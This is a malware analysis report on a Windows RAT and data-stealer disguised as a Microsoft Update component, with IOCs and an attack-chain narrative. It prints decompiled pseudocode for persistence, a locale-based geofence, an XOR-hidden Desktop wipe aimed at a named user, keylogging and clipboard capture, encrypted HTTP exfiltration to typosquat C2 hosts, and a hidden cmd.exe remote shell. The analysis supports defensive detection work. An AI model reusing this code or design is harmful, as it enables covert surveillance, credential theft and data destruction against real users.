# Incident Analysis Report

The submitted binary is a **Windows x64 RAT / data-stealer** posing as a Microsoft Update component, built with MinGW-w64 GCC. Below are the indicators, the proof from Ghidra, and an attack-chain narrative.

---

## 1. Identity & Build Artifacts

| Indicator | Evidence |
|---|---|
| Compiler: MinGW-w64 GCC 9.3 / 10 (win32, 2020-03-20 / 2022-01-13) | `.note.GNU` strings at `0x140014010-0x140014670` (`"GCC: (GNU) 9.3-win32 20200320"` ×many) — not a Microsoft-signed Update binary |
| TLS callbacks present (`tls_callback_0/1` at `0x140003e00`/`0x140003e30`) | Anti-debug / early-init hook surface |

---

## 2. Single-Instance + Geofence (Mutex & Locale check) — `FUN_14000318b`

```c
hMutex = CreateMutexA(0,1,"Global\\MicrosoftUpdateMutex");
if (GetLastError()==0xb7 /*ALREADY_EXISTS*/) { CloseHandle; return 0; }
if ((short)GetSystemDefaultLCID() == 0x419) { /* exit */ return 0; }
```

- **IOC – Mutex:** `Global\MicrosoftUpdateMutex` (string at `0x14001324f`).
- **Geofence:** `LCID 0x0419` is **ru-RU (Russian)**. The malware refuses to run on Russian-localized Windows — a classic CIS-evasion tell suggesting an attacker who does not want to hit Russian victims.

---

## 3. Persistence — `FUN_140002e83`

```c
SHGetFolderPathA(0, 0x1C /*CSIDL_LOCAL_APPDATA*/, ..., local_228);
sprintf(..., "%s\\Microsoft\\updater.exe", local_228);
CreateDirectoryA("...\\Microsoft", 0);
CopyFileA(self, "...\\Microsoft\\updater.exe", 0);

SHGetFolderPathA(0, 7 /*CSIDL_STARTUP*/, ..., local_558);
strcat(local_558, "\\msteams_updater.exe");   // built inline as "\\msteams" + "updater.exe"
CopyFileA(self, local_558, 0);

RegCreateKeyExA(HKCU, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", ...);
RegSetValueExA(..., "MicrosoftUpdater", REG_SZ, "...\\updater.exe");

RegCreateKeyExA(HKLM,
   "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\MicrosoftUpdater",
   ...);
RegSetValueExA(..., "SD",    REG_BINARY, 20 zero bytes);
RegSetValueExA(..., "Index", REG_DWORD,  1);
```

**IOC artifacts on disk / in registry:**
- File: `%LOCALAPPDATA%\Microsoft\updater.exe`
- File: `%USERPROFILE%\…\Startup\msteams_updater.exe` (auto-runs at logon — typosquats Microsoft Teams)
- HKCU `…\Run!MicrosoftUpdater` → `%LOCALAPPDATA%\Microsoft\updater.exe`
- HKLM `…\Schedule\TaskCache\Tree\MicrosoftUpdater` (fake Task Scheduler cache key — values `SD` + `Index=1`; lets a real scheduled task entry be hidden/spoofed)

---

## 4. Destructive Wipe — `FUN_14000221a` + `FUN_1400020c7`

The string is built obfuscated and XOR-decoded:

```c
local_28 = 0x73726573555c3a43;  // "C:\\Users"
local_20 = 0x5c737265646e415c;  // "\\Anders\\"
local_18 = 0x706f746b736544;    // "Desktop"
xor bytes [9..14] with {3,1,12,1,19,29};   // "Anders" -> "Bohdan"
GetFileAttributesA(s); if exists: FUN_1400020c7(s);  // recursive FindFirst/Next + DeleteFileA / RemoveDirectoryA
```

- **Decoded target path:** `C:\Users\Bohdan\Desktop`
- `FUN_1400020c7` recursively walks `<path>\*` and calls `DeleteFileA` on every file and `RemoveDirectoryA` on every subfolder.
- **Interpretation:** the operator has a specific named victim — user **Bohdan** — and the implant is configured to **wipe that user's Desktop** if it lands on that machine. Combined with the Russian-locale skip in §2 this strongly suggests targeting of a Ukrainian-named user while sparing Russian systems.

---

## 5. Reconnaissance + Initial Beacon — `FUN_1400022bb` / `FUN_140003233`

```c
GetComputerNameA(...); GetUserNameA(...); GetSystemInfo(...); GlobalMemoryStatusEx(...);
sprintf(buf, "Host: %s\nUser: %s\nArch: %s\nCPUs: %lu\nRAM: %llu MB\n", ...);
strstr(buf, "Host:"); sscanf(..., "Host: %255s", host);
FUN_1400017b0("/api/info", buf, len);   // plaintext POST
```

**IOC – C2 #1 (exfil):** `http://MiccosoftUpdate.com` (typosquat, double-c) — `FUN_1400017b0`

```c
InternetOpenA("Mozilla/5.0",...);
InternetConnectA(h,"MiccosoftUpdate.com",80,...);
HttpOpenRequestA(h,"POST",path,"HTTP/1.1",...);
HttpSendRequestA(req,"Content-Type: application/octet-stream\r\n",-1, body, len);
```

URIs used on this host: `/api/info` (host fingerprint, plaintext), `/api/data` (encrypted exfil — see §7).

---

## 6. Spying Loop (main thread) — `FUN_140003233`

A 100 ms polling loop performs three stealer functions:

1. **Keylogger** — iterates VK codes 8..0xFF using `GetAsyncKeyState`, handles Shift via `GetAsyncKeyState(0x10)`, accumulates up to 900 chars then flushes with type=1.
2. **Active-window logger** — `FUN_140001eb5` calls `GetForegroundWindow()` + `GetWindowTextA()`; on title change it writes `"[WINDOW: %s]"` (string `0x140013287`).
3. **Clipboard logger** — `FUN_140001fe4` → `FUN_140001f13` opens clipboard, reads `CF_TEXT`, dedupes against last value, writes `"[CLIPBOARD] %s"` (string `0x1400130d2`).

All three feed `FUN_140001df3` → `FUN_140001b8c` (AES encrypt) → `FUN_1400015dd` (base64) → `FUN_1400017b0("/api/data", …)`.

---

## 7. Crypto / Encoding

- **AES-128-ECB via BCrypt** (`FUN_140001b8c` encrypt, `FUN_140002884` decrypt):
  ```c
  BCryptOpenAlgorithmProvider(&h, L"AES", 0, 0);
  BCryptSetProperty(h, L"ChainingMode", L"ChainingModeECB", 0x20, 0);
  BCryptGenerateSymmetricKey(h, &k, 0,0, key /*<=16B*/, 0x10, 0);
  ```
  Key is the **first 16 bytes of a passphrase string** (truncated/zero-padded). Padding is custom PKCS#7-style (pad byte = pad length, stripped on decrypt if `<0x11`).
- **Base64** with standard alphabet at `0x140013298`: `ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/` (encode `FUN_1400015dd`, decode `FUN_1400026bf`).

---

## 8. Command-and-Control / Remote Shell

- **C2 #2 (commands):** `http://windowsupdater.tk` (free-TLD `.tk`) — `FUN_1400018e7`
  ```c
  InternetConnectA(h, "windowsupdater.tk", 80, ...);
  POST /update/servicedata           // FUN_140001ad4 sends typed (encrypted+b64) message
  ```
  Other path strings present and likely used by the polling thread:
  - `/windows/checkforupdate` (`0x140013141`)
  - JSON tag parsed: `"command":` (`0x14000317f`)

- **Shell execution** — `FUN_1400023e9`:
  ```c
  CreatePipe(...); 
  sprintf(cmdline, "cmd.exe /c %s", attacker_command);
  CreateProcessA(NULL, cmdline, ..., CREATE_NO_WINDOW=0x08000000, &si, &pi);
  ReadFile(pipe, ...);   // capture stdout
  FUN_140001e54(3, output, host);   // type=3, AES+b64, POST /update/servicedata
  ```
  The console of the implant itself is hidden via `FreeConsole()` early in `FUN_140003233`.

The C2 thread that polls `windowsupdater.tk` is launched at the start of `FUN_140003233`:
```c
CreateThread(0,0, (LPTHREAD_START_ROUTINE)0x140002a28, hostbuf, ...);
```

Message-type byte prepended to each upload (seen in callers of `FUN_140001a1c`/`FUN_140001ad4`):

| type | meaning | path |
|---|---|---|
| 1 | keystrokes / window / clipboard | `/api/data` |
| 3 | shell command output | `/update/servicedata` |

---

## 9. Consolidated IOC List

**Network**
- `MiccosoftUpdate.com` (HTTP/80) — typosquat of "Microsoft" (double-c)
- `windowsupdater.tk` (HTTP/80)
- URIs: `/api/info`, `/api/data`, `/update/servicedata`, `/windows/checkforupdate`
- User-Agent: `Mozilla/5.0`
- JSON command field: `"command":`

**Host – files**
- `%LOCALAPPDATA%\Microsoft\updater.exe`
- `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\msteams_updater.exe`
- Wipe target: `C:\Users\Bohdan\Desktop\*` (recursive)

**Host – registry**
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` → `MicrosoftUpdater` = `…\updater.exe`
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\MicrosoftUpdater` (`SD`, `Index=1`)

**Host – synchronization**
- Mutex: `Global\MicrosoftUpdateMutex`

**Behavioral**
- AES-128-ECB (BCrypt) + base64 wrapping of all stolen data and commands
- Keylogger via `GetAsyncKeyState` (100 ms loop)
- Clipboard capture via `OpenClipboard`/`GetClipboardData(CF_TEXT)`
- Foreground-window title capture via `GetForegroundWindow`/`GetWindowTextA`
- Remote shell via `CreatePipe` + `CreateProcessA("cmd.exe /c …", CREATE_NO_WINDOW)`
- Locale skip on `0x0419` (ru-RU)

---

## 10. What the attacker likely did

1. **Delivery & install**: the operator landed `updater.exe` on the victim and let the implant run. It claimed the `MicrosoftUpdateMutex`, **dropped two persistence copies** (`%LOCALAPPDATA%\Microsoft\updater.exe` and a Teams-themed copy in the per-user Startup folder), set an HKCU `Run` value, and planted a fake Task-Scheduler-cache key under HKLM to blend in with legitimate scheduled tasks.
2. **Geofencing**: it checked the system locale and would silently exit on Russian Windows (`LCID 0x0419`) — strong indication the campaign deliberately avoids Russian victims.
3. **Reconnaissance**: it sent a plaintext POST to `MiccosoftUpdate.com/api/info` containing hostname, username, CPU architecture, CPU count and RAM — a fingerprint to triage the victim.
4. **Surveillance**: a 100 ms loop captured keystrokes (with Shift handling), the foreground window title every time it changed, and the clipboard whenever it changed; all of it AES-ECB-encrypted, base64-wrapped, and POSTed to `/api/data`.
5. **Hands-on-keyboard**: a parallel thread beaconed to `windowsupdater.tk/update/servicedata` (and `/windows/checkforupdate`), pulled JSON commands containing a `"command":` string, ran them via hidden `cmd.exe /c`, and uploaded the captured stdout (message type 3).
6. **Targeted destruction**: if the user profile `C:\Users\Bohdan\Desktop` exists on the box, the implant **recursively wipes** it — files via `DeleteFileA`, folders via `RemoveDirectoryA`. The path is XOR-obfuscated to evade trivial string scans, indicating intent to specifically harm a named individual.

Combined, this is a **targeted spyware-with-wiper** package: a typosquatted-Microsoft-update-themed RAT with keylog/clipboard/window-title exfil and remote shell over two HTTP C2s, plus a destructive desktop-wipe routine aimed at user "Bohdan" while sparing Russian-locale machines.